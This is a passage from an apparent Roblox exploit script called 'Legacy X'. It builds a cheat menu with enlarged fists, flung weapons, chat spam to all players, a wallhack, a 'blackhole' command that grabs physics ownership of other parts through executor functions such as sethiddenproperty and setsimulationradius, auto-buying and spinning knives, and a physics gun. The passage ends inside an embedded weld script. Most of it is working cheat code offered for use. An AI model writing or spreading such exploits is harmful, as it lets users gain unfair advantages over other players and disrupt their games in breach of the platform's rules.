				wait(0) local A_1 = "[Legacy X] FreeFists Switched To True." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 


				local Players = game:GetService("Players")
				local RunService = game:GetService("RunService")

				local LocalPlayer = Players.LocalPlayer
				local Mouse = LocalPlayer:GetMouse()

				local Character = LocalPlayer.Character
				local RightHand = Character.RightHand
				local Character = LocalPlayer.Character
				local LeftHand = Character.LeftHand

				wait(3)

				local Box = Instance.new("SelectionBox")
				Box.LineThickness = 0.15
				Box.Color3 = Color3.new(0, 1, 0.0313725)
				Box.Adornee = RightHand
				Box.Parent = RightHand

				LeftHand.LeftWrist:Destroy()
				game.Players.LocalPlayer.Character.LeftHand.Size = Vector3.new(4,4,4)

				local Box = Instance.new("SelectionBox")
				Box.LineThickness = 0.15
				Box.Color3 = Color3.new(0.215686, 1, 0)
				Box.Adornee = LeftHand
				Box.Parent = LeftHand

				RightHand.RightWrist:Destroy() 
				game.Players.LocalPlayer.Character.RightHand.Size = Vector3.new(4,4,4)

				while true do 
					pcall(function()
						RightHand.Position = Mouse.Hit.p
						RightHand.Rotation = Vector3.new(0,0,0)
						RightHand.Massless = true
						LeftHand.Position = Mouse.Hit.p
						LeftHand.Rotation = Vector3.new(0,0,0)
						LeftHand.Massless = true
					end)
					pcall(function()
						local Tool = Character:FindFirstChildOfClass("Tool")
						Tool.Handle.Position = RightHand.Position
						Tool.Handle.Position = LeftHand.Position
					end)
					RunService.RenderStepped:Wait()
				end
			end)


			FixRightFists.Name = "Fix Right Fists"
			FixRightFists.Parent = ScrollingFrame
			FixRightFists.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FixRightFists.BorderSizePixel = 0
			FixRightFists.Position = UDim2.new(0.109376982, 0, 0.712376118, 0)
			FixRightFists.Size = UDim2.new(0, 216, 0, 29)
			FixRightFists.Font = Enum.Font.Cartoon
			FixRightFists.Text = "Fix Right Fist"
			FixRightFists.TextColor3 = Color3.fromRGB(255, 255, 255)
			FixRightFists.TextScaled = true
			FixRightFists.TextSize = 14.000
			FixRightFists.TextWrapped = true

			UICorner_21.CornerRadius = UDim.new(0.25, 0)
			UICorner_21.Parent = FixRightFists
			FixRightFists.MouseButton1Down:connect(function()
				game.Players.LocalPlayer.Character.RightHand.Size = Vector3.new(1,1,1)
			end)

			FixLeftFists.Name = "Fix Left Fists"
			FixLeftFists.Parent = ScrollingFrame
			FixLeftFists.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FixLeftFists.BorderSizePixel = 0
			FixLeftFists.Position = UDim2.new(0.10576687, 0, 0.748028278, 0)
			FixLeftFists.Size = UDim2.new(0, 216, 0, 29)
			FixLeftFists.Font = Enum.Font.Cartoon
			FixLeftFists.Text = "Fix Left Fist"
			FixLeftFists.TextColor3 = Color3.fromRGB(255, 255, 255)
			FixLeftFists.TextScaled = true
			FixLeftFists.TextSize = 14.000
			FixLeftFists.TextWrapped = true

			UICorner_22.CornerRadius = UDim.new(0.25, 0)
			UICorner_22.Parent = FixLeftFists
			FixLeftFists.MouseButton1Down:connect(function()
				game.Players.LocalPlayer.Character.LeftHand.Size = Vector3.new(1,1,1)
			end)

			Info.Name = "Info"
			Info.Parent = ScrollingFrame
			Info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Info.BackgroundTransparency = 1.000
			Info.BorderColor3 = Color3.fromRGB(27, 42, 53)
			Info.Position = UDim2.new(0.0263444912, 0, 0.951430261, 0)
			Info.Size = UDim2.new(0, 262, 0, 50)
			Info.Font = Enum.Font.SourceSans
			Info.Text = " Hi Legacy X Was Made By Owner: SploitGodZ Scripters: Bill Cosby#4429 "
			Info.TextColor3 = Color3.fromRGB(140, 140, 140)
			Info.TextScaled = true
			Info.TextSize = 14.000
			Info.TextWrapped = true

			FlyGun.Name = "Fly Gun"
			FlyGun.Parent = ScrollingFrame
			FlyGun.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FlyGun.BorderSizePixel = 0
			FlyGun.Position = UDim2.new(0.10576687, 0, 0.787158728, 0)
			FlyGun.Size = UDim2.new(0, 216, 0, 29)
			FlyGun.Font = Enum.Font.Cartoon
			FlyGun.Text = "Airstrike [Guns Only]"
			FlyGun.TextColor3 = Color3.fromRGB(255, 255, 255)
			FlyGun.TextScaled = true
			FlyGun.TextSize = 14.000
			FlyGun.TextWrapped = true

			UICorner_23.CornerRadius = UDim.new(0.25, 0)
			UICorner_23.Parent = FlyGun
			FlyGun.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Airstrike Switched To True." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 

				for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do                 if v:isA("Tool") then                     local a = Instance.new("SelectionBox",v.Handle)                     a.Adornee = v.Handle                         v.GripPos = Vector3.new(10,-10,10)                     lplayer.Character.Humanoid:UnequipTools()                 end end
			end)

			FlyMeleeWeapon.Name = "Fly Melee Weapon"
			FlyMeleeWeapon.Parent = ScrollingFrame
			FlyMeleeWeapon.BackgroundColor3 = Color3.fromRGB(255, 0, 68)
			FlyMeleeWeapon.BorderSizePixel = 0
			FlyMeleeWeapon.Position = UDim2.new(0.10576687, 0, 0.824550033, 0)
			FlyMeleeWeapon.Size = UDim2.new(0, 216, 0, 29)
			FlyMeleeWeapon.Font = Enum.Font.Cartoon
			FlyMeleeWeapon.Text = "Fly Melee Weapon"
			FlyMeleeWeapon.TextColor3 = Color3.fromRGB(255, 255, 255)
			FlyMeleeWeapon.TextScaled = true
			FlyMeleeWeapon.TextSize = 14.000
			FlyMeleeWeapon.TextWrapped = true

			UICorner_24.CornerRadius = UDim.new(0.25, 0)
			UICorner_24.Parent = FlyMeleeWeapon
			FlyMeleeWeapon.MouseButton1Down:connect(function()
				wait(0) local A_1 = "[Legacy X] Fly Melee Weapons Enabled." local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do                 if v:isA("Tool") then                     local a = Instance.new("SelectionBox",v.Handle)                     a.Adornee = v.Handle                         v.GripPos = Vector3.new(15,15,15)                     lplayer.Character.Humanoid:UnequipTools()                 end end
			end)
			Frame.Name = "Frame"
			Frame.Parent = MainFrame
			Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Frame.BackgroundTransparency = 1.000
			Frame.Position = UDim2.new(0.176895306, 0, 0.847826242, 0)
			Frame.Size = UDim2.new(0, 180, 0, 29)
			Frame.Image = "rbxassetid://3570695787"
			Frame.ImageColor3 = Color3.fromRGB(24, 24, 24)
			Frame.ScaleType = Enum.ScaleType.Slice
			Frame.SliceCenter = Rect.new(100, 100, 100, 100)
			Frame.SliceScale = 0.080

			TextBox.Parent = Frame
			TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextBox.BackgroundTransparency = 1.000
			TextBox.BorderSizePixel = 0
			TextBox.Size = UDim2.new(0, 180, 0, 29)
			TextBox.Font = Enum.Font.PatrickHand
			TextBox.Text = "Command Here."
			TextBox.TextColor3 = Color3.fromRGB(255, 0, 98)
			TextBox.TextSize = 14.000

			Fatel.Name = "Fatel"
			Fatel.Parent = MainFrame
			Fatel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Fatel.BackgroundTransparency = 1.000
			Fatel.BorderSizePixel = 0
			Fatel.Size = UDim2.new(0, 66, 0, 29)
			Fatel.Font = Enum.Font.Cartoon
			Fatel.Text = "Legacy"
			Fatel.TextColor3 = Color3.fromRGB(255, 255, 255)
			Fatel.TextSize = 21.000
			Fatel.TextWrapped = true

			-- Scripts:

			local function VZEQVF_fake_script() -- LegacyX.IntroScript 
				local script = Instance.new('LocalScript', LegacyX)

				-- // Variables
				local StarterFrame     = script.Parent.Main
				local TweenService     = game:GetService("TweenService");

				-- // Properties
				StarterFrame.Size = UDim2.new(0, 292, 0, 57)
				StarterFrame["Main Frame"].Visible = false;

				-- // Functions
				function TweenFrameSize(frame, endudim2, tweentime)

					local goal = {};
					goal.Size = endudim2

					local info = TweenInfo.new(tweentime);

					local a = TweenService:Create(frame, info, goal);
					a:Play();
				end


				-- // Fade In

				repeat
					wait();
					StarterFrame.ImageTransparency = StarterFrame.ImageTransparency - 0.07;
				until StarterFrame.ImageTransparency <= 0;

				TweenFrameSize(StarterFrame, UDim2.new(0, 292, 0, 250), .20);
				wait(.20)

				StarterFrame["Main Frame"].Visible = true

			end
			coroutine.wrap(VZEQVF_fake_script)()

			-- // Keybind
			local Toggled = false
			game:GetService("UserInputService").InputBegan:connect(function(Key, g)
				if g then return end;
				if Key.KeyCode == Enum.KeyCode.G then
					if Toggled == false then
						Toggled = true
						Main.Visible = false
					elseif Toggled == true then
						Toggled = false;
						Main.Visible = true;
					end;
				end;
			end)
		end;
	});
end;

	addCommand({
		["Name"] = "wallhack";
		["Function"] = function()
			pcall(function()
				game.Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
			end)
		end;
	});

	addCommand({
		["Name"] = "blackhole";
		["Function"] = function()
			sendOutput(" Blackhole Enabled.");
			local UserInputService = game:GetService("UserInputService")
			local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
			local Folder = Instance.new("Folder", game:GetService("Workspace"))
			local Part = Instance.new("Part", Folder)
			local Attachment1 = Instance.new("Attachment", Part)
			Part.Anchored = true
			Part.CanCollide = false
			Part.Transparency = 1
			local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
			local NetworkAccess = coroutine.create(function()
				settings().Physics.AllowSleep = false
				while game:GetService("RunService").RenderStepped:Wait() do
					for _, Players in next, game:GetService("Players"):GetPlayers() do
						if Players ~= game:GetService("Players").LocalPlayer then
							Players.MaximumSimulationRadius = 0 
							sethiddenproperty(Players, "SimulationRadius", 0) 
						end 
					end
					game:GetService("Players").LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
					setsimulationradius(math.huge) 
				end 
			end) 
			coroutine.resume(NetworkAccess)
			local function ForcePart(v)
				if v:IsA("Part") and v.Anchored == false and v.Parent:FindFirstChild("Humanoid") == nil and v.Parent:FindFirstChild("Head") == nil and v.Name ~= "Handle" then
					Mouse.TargetFilter = v
					for _, x in next, v:GetChildren() do
						if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
							x:Destroy()
						end
					end
					if v:FindFirstChild("Attachment") then
						v:FindFirstChild("Attachment"):Destroy()
					end
					if v:FindFirstChild("AlignPosition") then
						v:FindFirstChild("AlignPosition"):Destroy()
					end
					if v:FindFirstChild("Torque") then
						v:FindFirstChild("Torque"):Destroy()
					end
					v.CanCollide = false
					local Torque = Instance.new("Torque", v)
					Torque.Torque = Vector3.new(100000, 100000, 100000)
					local AlignPosition = Instance.new("AlignPosition", v)
					local Attachment2 = Instance.new("Attachment", v)
					Torque.Attachment0 = Attachment2
					AlignPosition.MaxForce = 9999999999999999
					AlignPosition.MaxVelocity = math.huge
					AlignPosition.Responsiveness = 200
					AlignPosition.Attachment0 = Attachment2 
					AlignPosition.Attachment1 = Attachment1
				end
			end
			for _, v in next, game:GetService("Workspace"):GetDescendants() do
				ForcePart(v)
			end
			game:GetService("Workspace").DescendantAdded:Connect(function(v)
				ForcePart(v)
			end)
			UserInputService.InputBegan:Connect(function(Key, Chat)
				if Key.KeyCode == Enum.KeyCode.E and not Chat then
					Updated = Mouse.Hit + Vector3.new(0, 5, 0)
				end
			end)
			spawn(function()
				while game:GetService("RunService").RenderStepped:Wait() do
					Attachment1.WorldCFrame = Updated
				end
			end)


		end;
	});

	addCommand({
		["Name"] = "tornado";
		["Function"] = function()
			sendOutput(" Tornado Enabled.");
			local d = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
			pcall(function()
				for i, v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
					if v.Name == '[Knife]' then
						v.Parent = game:GetService("Players").LocalPlayer.Character
					end
				end
			end)
			wait(.2)
			local targetpos = CFrame.new(-278.063446, 21.75, -240.871841)
			local plr = game:GetService("Players").LocalPlayer
			local pos = plr.Character.HumanoidRootPart.Position
			if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("[Knife]") then
				plr.Character.HumanoidRootPart.CFrame = targetpos
				local cd = game:GetService("Workspace").Ignored.Shop["[Knife] - $150"]:FindFirstChild("ClickDetector")
				wait(.2)
				fireclickdetector(cd)
				wait(.2)
				game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(2, -5, -1.5)
				game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
				game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(1, 0, -3)
				game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(0, 0, 0)
				game:GetService("Players").LocalPlayer.Backpack["[Knife]"].Parent = game:GetService("Players").LocalPlayer.Character
				spin = true
				local spinSpeed = 100
				local speaker = game:GetService("Players").LocalPlayer
				for i, v in pairs(speaker.Character.HumanoidRootPart:GetChildren()) do
					if v.Name == "Spinning" then
						v:Destroy()
					end
				end
				local Spin = Instance.new("BodyAngularVelocity", speaker.Character.HumanoidRootPart)
				Spin.Name = "Spinning"
				Spin.MaxTorque = Vector3.new(0, math.huge, 0)
				Spin.AngularVelocity = Vector3.new(0, spinSpeed, 0)
			end
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d) 
		end;
	});

	addCommand({
		["Name"] = "ultraknife";
		["Function"] = function()
			sendOutput(" Ultra Knife Enabled.");

			local knifes = {}
			for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
				if v.Name == "[Knife]" then
					table.insert(knifes, v)
				end
			end
			for x = 1, #knifes do
				local box = Instance.new("SelectionBox", knifes[x].Handle)
				box.Adornee = knifes[x].Handle
				box.Color3 = Color3.new(1, 0, 0)
				knifes[x].Handle.Transparency = 1 
				knifes[x].Handle.Size = Vector3.new(x, x, x)
				knifes[x].Parent = game.Players.LocalPlayer.Character
			end
		end;
	});

	addCommand({
		["Name"] = "physicsgun";
		["Function"] = function()
			sendNotif("", "Physics Gun Enabled.", 15);
			--Physics gun
			function sandbox(var,func)
				local env = getfenv(func)
				local newenv = setmetatable({},{
					__index = function(self,k)
						if k=="script" then
							return var
						else
							return env[k]
						end
					end,
				})
				setfenv(func,newenv)
				return func
			end
			cors = {}
			mas = Instance.new("Model",game:GetService("Lighting"))
			Tool0 = Instance.new("Tool")
			Part1 = Instance.new("Part")
			CylinderMesh2 = Instance.new("CylinderMesh")
			Part3 = Instance.new("Part")
			LocalScript4 = Instance.new("LocalScript")
			Script5 = Instance.new("Script")
			LocalScript6 = Instance.new("LocalScript")
			Script7 = Instance.new("Script")
			LocalScript8 = Instance.new("LocalScript")
			Part9 = Instance.new("Part")
			Script10 = Instance.new("Script")
			Part11 = Instance.new("Part")
			Script12 = Instance.new("Script")
			Part13 = Instance.new("Part")
			Script14 = Instance.new("Script")
			Tool0.Name = "Physics Gun"
			Tool0.Parent = mas
			Tool0.CanBeDropped = false
			Part1.Name = "Handle"
			Part1.Parent = Tool0
			Part1.Material = Enum.Material.Neon
			Part1.BrickColor = BrickColor.new("Cyan")
			Part1.Transparency = 1
			Part1.Rotation = Vector3.new(0, 15.4200001, 0)
			Part1.CanCollide = false
			Part1.FormFactor = Enum.FormFactor.Custom
			Part1.Size = Vector3.new(1, 0.400000036, 0.300000012)
			Part1.CFrame = CFrame.new(-55.2695465, 0.696546972, 0.383156985, 0.96399641, -4.98074878e-05, 0.265921414, 4.79998416e-05, 1, 1.32960558e-05, -0.265921414, -5.30653779e-08, 0.96399641)
			Part1.BottomSurface = Enum.SurfaceType.Smooth
			Part1.TopSurface = Enum.SurfaceType.Smooth
			Part1.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Part1.Position = Vector3.new(-55.2695465, 0.696546972, 0.383156985)
			Part1.Orientation = Vector3.new(0, 15.4200001, 0)
			Part1.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			CylinderMesh2.Parent = Part1
			CylinderMesh2.Scale = Vector3.new(0.100000001, 0.100000001, 0.100000001)
			CylinderMesh2.Scale = Vector3.new(0.100000001, 0.100000001, 0.100000001)
			Part3.Name = "Shoot"
			Part3.Parent = Tool0
			Part3.Material = Enum.Material.Neon
			Part3.BrickColor = BrickColor.new("Cyan")
			Part3.Reflectance = 0.30000001192093
			Part3.Transparency = 1
			Part3.Rotation = Vector3.new(90.9799957, 0.25999999, -91.409996)
			Part3.CanCollide = false
			Part3.FormFactor = Enum.FormFactor.Custom
			Part3.Size = Vector3.new(0.200000003, 0.25, 0.310000032)
			Part3.CFrame = CFrame.new(-54.7998123, 0.774299085, -0.757350147, -0.0245519895, 0.99968797, 0.00460194098, 0.0169109926, 0.00501798885, -0.999844491, -0.999555528, -0.0244703442, -0.0170289185)
			Part3.BottomSurface = Enum.SurfaceType.Smooth
			Part3.TopSurface = Enum.SurfaceType.Smooth
			Part3.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			Part3.Position = Vector3.new(-54.7998123, 0.774299085, -0.757350147)
			Part3.Orientation = Vector3.new(88.9899979, 164.87999, 73.4700012)
			Part3.Color = Color3.new(0.0156863, 0.686275, 0.92549)
			LocalScript4.Parent = Tool0
			table.insert(cors,sandbox(LocalScript4,function()
				-- Variables for services
				local render = game:GetService("RunService").RenderStepped
				local contextActionService = game:GetService("ContextActionService")
				local userInputService = game:GetService("UserInputService")

				local player = game.Players.LocalPlayer
				local mouse = player:GetMouse()
				local Tool = script.Parent

				-- Variables for Module Scripts
				local screenSpace = require(Tool:WaitForChild("ScreenSpace"))

				local connection
				-- Variables for character joints

				local neck, shoulder, oldNeckC0, oldShoulderC0 

				local mobileShouldTrack = true

				-- Thourough check to see if a character is sitting
				local function amISitting(character)
					local t = character.Torso
					for _, part in pairs(t:GetConnectedParts(true)) do
						if part:IsA("Seat") or part:IsA("VehicleSeat") then
							return true
						end
					end
				end

				-- Function to call on renderstepped. Orients the character so it is facing towards
				-- the player mouse's position in world space. If character is sitting then the torso
				-- should not track
				local function frame(mousePosition)
					-- Special mobile consideration. We don't want to track if the user was touching a ui
					-- element such as the movement controls. Just return out of function if so to make sure
					-- character doesn't track
					if not mobileShouldTrack then return end

					-- Make sure character isn't swiming. If the character is swimming the following code will
					-- not work well; the character will not swim correctly. Besides, who shoots underwater?
					if player.Character.Humanoid:GetState() ~= Enum.HumanoidStateType.Swimming then
						local torso = player.Character.Torso
						local head = player.Character.Head

						local toMouse = (mousePosition - head.Position).unit
						local angle = math.acos(toMouse:Dot(Vector3.new(0,1,0)))

						local neckAngle = angle

						-- Limit how much the head can tilt down. Too far and the head looks unnatural
						if math.deg(neckAngle) > 110 then
							neckAngle = math.rad(110)
						end
						neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.pi - neckAngle,math.pi,0)

						-- Calculate horizontal rotation
						local arm = player.Character:FindFirstChild("Right Arm")
						local fromArmPos = torso.Position + torso.CFrame:vectorToWorldSpace(Vector3.new(
							torso.Size.X/2 + arm.Size.X/2, torso.Size.Y/2 - arm.Size.Z/2, 0))
						local toMouseArm = ((mousePosition - fromArmPos) * Vector3.new(1,0,1)).unit
						local look = (torso.CFrame.lookVector * Vector3.new(1,0,1)).unit
						local lateralAngle = math.acos(toMouseArm:Dot(look))		

						-- Check for rogue math
						if tostring(lateralAngle) == "-1.#IND" then
							lateralAngle = 0
						end		

						-- Handle case where character is sitting down
						if player.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then			

							local cross = torso.CFrame.lookVector:Cross(toMouseArm)
							if lateralAngle > math.pi/2 then
								lateralAngle = math.pi/2
							end
							if cross.Y < 0 then
								lateralAngle = -lateralAngle
							end
						end	

						-- Turn shoulder to point to mouse
						shoulder.C0 = CFrame.new(1,0.5,0) * CFrame.Angles(math.pi/2 - angle,math.pi/2 + lateralAngle,0)	

						-- If not sitting then aim torso laterally towards mouse
						if not amISitting(player.Character) then
							torso.CFrame = CFrame.new(torso.Position, torso.Position + (Vector3.new(
								mousePosition.X, torso.Position.Y, mousePosition.Z)-torso.Position).unit)
						else
							--print("sitting")		
						end	
					end
				end

				-- Function to bind to render stepped if player is on PC
				local function pcFrame()
					frame(mouse.Hit.p)
				end

				-- Function to bind to touch moved if player is on mobile
				local function mobileFrame(touch, processed)
					-- Check to see if the touch was on a UI element. If so, we don't want to update anything
					if not processed then
						-- Calculate touch position in world space. Uses Stravant's ScreenSpace Module script
						-- to create a ray from the camera.
						local test = screenSpace.ScreenToWorld(touch.Position.X, touch.Position.Y, 1)
						local nearPos = game.Workspace.CurrentCamera.CoordinateFrame:vectorToWorldSpace(screenSpace.ScreenToWorld(touch.Position.X, touch.Position.Y, 1))
						nearPos = game.Workspace.CurrentCamera.CoordinateFrame.p - nearPos
						local farPos = screenSpace.ScreenToWorld(touch.Position.X, touch.Position.Y,50) 
						farPos = game.Workspace.CurrentCamera.CoordinateFrame:vectorToWorldSpace(farPos) * -1
						if farPos.magnitude > 900 then
							farPos = farPos.unit * 900
						end
						local ray = Ray.new(nearPos, farPos)
						local part, pos = game.Workspace:FindPartOnRay(ray, player.Character)

						-- if a position was found on the ray then update the character's rotation
						if pos then
							frame(pos)
						end
					end
				end

				local oldIcon = nil
				-- Function to bind to equip event
				local function equip()
					local torso = player.Character.Torso

					-- Setup joint variables
					neck = torso.Neck	
					oldNeckC0 = neck.C0
					shoulder = torso:FindFirstChild("Right Shoulder")
					oldShoulderC0 = shoulder.C0

					-- Remember old mouse icon and update current
					oldIcon = mouse.Icon
					mouse.Icon = "rbxassetid:// 509381906"

					-- Bind TouchMoved event if on mobile. Otherwise connect to renderstepped
					if userInputService.TouchEnabled then
						connection = userInputService.TouchMoved:connect(mobileFrame)
					else
						connection = render:connect(pcFrame)
					end

					-- Bind TouchStarted and TouchEnded. Used to determine if character should rotate
					-- during touch input
					userInputService.TouchStarted:connect(function(touch, processed)
						mobileShouldTrack = not processed
					end)	
					userInputService.TouchEnded:connect(function(touch, processed)
						mobileShouldTrack = false
					end)

					-- Fire server's equip event
					game.ReplicatedStorage.ROBLOX_PistolEquipEvent:FireServer()

					-- Bind event for when mouse is clicked to fire server's fire event
					mouse.Button1Down:connect(function()
						game.ReplicatedStorage.ROBLOX_PistolFireEvent:FireServer(mouse.Hit.p)
					end)

					-- Bind reload event to mobile button and r key
					contextActionService:BindActionToInputTypes("Reload", function() 
						game.ReplicatedStorage.ROBLOX_PistolReloadEvent:FireServer()		
					end, true, "")

					-- If game uses filtering enabled then need to update server while tool is
					-- held by character.
					if workspace.FilteringEnabled then
						while connection do
							wait()
							game.ReplicatedStorage.ROBLOX_PistolUpdateEvent:FireServer(neck.C0, shoulder.C0)
						end
					end
				end

				-- Function to bind to Unequip event
				local function unequip()
					if connection then connection:disconnect() end
					contextActionService:UnbindAction("Reload")
					game.ReplicatedStorage.ROBLOX_PistolUnequipEvent:FireServer()
					mouse.Icon = oldIcon
					neck.C0 = oldNeckC0
					shoulder.C0 = oldShoulderC0
				end

				-- Bind tool events
				Tool.Equipped:connect(equip)
				Tool.Unequipped:connect(unequip)
			end))
			Script5.Name = "qPerfectionWeld"
			Script5.Parent = Tool0
			table.insert(cors,sandbox(Script5,function()
				-- Created by Quenty (@Quenty, follow me on twitter).
				-- Should work with only ONE copy, seamlessly with weapons, trains, et cetera.
				-- Parts should be ANCHORED before use. It will, however, store relatives values and so when tools are reparented, it'll fix them.

--[[ INSTRUCTIONS
- Place in the model
- Make sure model is anchored
- That's it. It will weld the model and all children. 

THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 
THIS SCRIPT SHOULD BE USED ONLY BY ITSELF. THE MODEL SHOULD BE ANCHORED. 

This script is designed to be used is a regular script. In a local script it will weld, but it will not attempt to handle ancestory changes. 
]]

--[[ DOCUMENTATION
- Will work in tools. If ran more than once it will not create more than one weld.  This is especially useful for tools that are dropped and then picked up again.
- Will work in PBS servers
- Will work as long as it starts out with the part anchored
- Stores the relative CFrame as a CFrame value
- Takes careful measure to reduce lag by not having a joint set off or affected by the parts offset from origin
- Utilizes a recursive algorith to find all parts in the model
- Will reweld on script reparent if the script is initially parented to a tool.
- Welds as fast as possible
]]

				-- qPerfectionWeld.lua
				-- Created 10/6/2014
				-- Author: Quenty
				-- Version 1.0.3

				-- Updated 10/14/2014 - Updated to 1.0.1
				--- Bug fix with existing ROBLOX welds ? Repro by asimo3089

				-- Updated 10/14/2014 - Updated to 1.0.2
				--- Fixed bug fix. 

				-- Updated 10/14/2014 - Updated to 1.0.3
				--- Now handles joints semi-acceptably. May be rather hacky with some joints. :/

				local NEVER_BREAK_JOINTS = false -- If you set this to true it will never break joints (this can create some welding issues, but can save stuff like hinges).


				local function CallOnChildren(Instance, FunctionToCall)
					-- Calls a function on each of the children of a certain object, using recursion.  

					FunctionToCall(Instance)

					for _, Child in next, Instance:GetChildren() do
						CallOnChildren(Child, FunctionToCall)
					end
				end

				local function GetNearestParent(Instance, ClassName)
					-- Returns the nearest parent of a certain class, or returns nil

					local Ancestor = Instance
					repeat
						Ancestor = Ancestor.Parent
						if Ancestor == nil then
							return nil
						end
					until Ancestor:IsA(ClassName)

					return Ancestor
				end

				local function GetBricks(StartInstance)
					local List = {}

					-- if StartInstance:IsA("BasePart") then
					-- 	List[#List+1] = StartInstance
					-- end

					CallOnChildren(StartInstance, function(Item)
						if Item:IsA("BasePart") then
							List[#List+1] = Item;
						end
					end)

					return List
				end

				local function Modify(Instance, Values)
					-- Modifies an Instance by using a table.  

					assert(type(Values) == "table", "Values is not a table");

					for Index, Value in next, Values do
						if type(Index) == "number" then
							Value.Parent = Instance
						else
							Instance[Index] = Value
						end
					end
					return Instance
				end

				local function Make(ClassType, Properties)
					-- Using a syntax hack to create a nice way to Make new items.  

					return Modify(Instance.new(ClassType), Properties)
				end

				local Surfaces = {"TopSurface", "BottomSurface", "LeftSurface", "RightSurface", "FrontSurface", "BackSurface"}
				local HingSurfaces = {"Hinge", "Motor", "SteppingMotor"}

				local function HasWheelJoint(Part)
					for _, SurfaceName in pairs(Surfaces) do
						for _, HingSurfaceName in pairs(HingSurfaces) do
							if Part[SurfaceName].Name == HingSurfaceName then
								return true
							end
						end
					end

					return false
				end

				local function ShouldBreakJoints(Part)
					--- We do not want to break joints of wheels/hinges. This takes the utmost care to not do this. There are
					--  definitely some edge cases. 

					if NEVER_BREAK_JOINTS then
						return false
					end

					if HasWheelJoint(Part) then
						return false
					end

					local Connected = Part:GetConnectedParts()

					if #Connected == 1 then
						return false
					end

					for _, Item in pairs(Connected) do
						if HasWheelJoint(Item) then
							return false
						elseif not Item:IsDescendantOf(script.Parent) then
							return false
						end
					end

					return true
				end

				local function WeldTogether(Part0, Part1, JointType, WeldParent)
					--- Weld's 2 parts together
					-- @param Part0 The first part
					-- @param Part1 The second part (Dependent part most of the time).
					-- @param [JointType] The type of joint. Defaults to weld.
					-- @param [WeldParent] Parent of the weld, Defaults to Part0 (so GC is better).
					-- @return The weld created.

					JointType = JointType or "Weld"
					local RelativeValue = Part1:FindFirstChild("qRelativeCFrameWeldValue")

					local NewWeld = Part1:FindFirstChild("qCFrameWeldThingy") or Instance.new(JointType)
					Modify(NewWeld, {
						Name = "qCFrameWeldThingy";
						Part0  = Part0;
						Part1  = Part1;
						C0     = CFrame.new();--Part0.CFrame:inverse();
						C1     = RelativeValue and RelativeValue.Value or Part1.CFrame:toObjectSpace(Part0.CFrame); --Part1.CFrame:inverse() * Part0.CFrame;-- Part1.CFrame:inverse();
						Parent = Part1;
					})

					if not RelativeValue then
						RelativeValue = Make("CFrameValue", {
							Parent     = Part1;
							Name       = "qRelativeCFrameWeldValue";
							Archivable = true;
							Value      = NewWeld.C1;
						})
					end

					return NewWeld
				end

				local function WeldParts(Parts, MainPart, JointType, DoNotUnanchor)
					-- @param Parts The Parts to weld. Should be anchored to prevent really horrible results.
					-- @param MainPart The part to weld the model to (can be in the model).
					-- @param [JointType] The type of joint. Defaults to weld. 
					-- @parm DoNotUnanchor Boolean, if true, will not unachor the model after cmopletion.

					for _, Part in pairs(Parts) do
						if ShouldBreakJoints(Part) then
							Part:BreakJoints()
						end
					end

					for _, Part in pairs(Parts) do
						if Part ~= MainPart then
							WeldTogether(MainPart, Part, JointType, MainPart)
						end
					end

					if not DoNotUnanchor then
						for _, Part in pairs(Parts) do
							Part.Anchored = false
						end
						MainPart.Anchored = false
					end
				end

				local function PerfectionWeld()	
					local Tool = GetNearestParent(script, "Tool")

					local Parts = GetBricks(script.Parent)
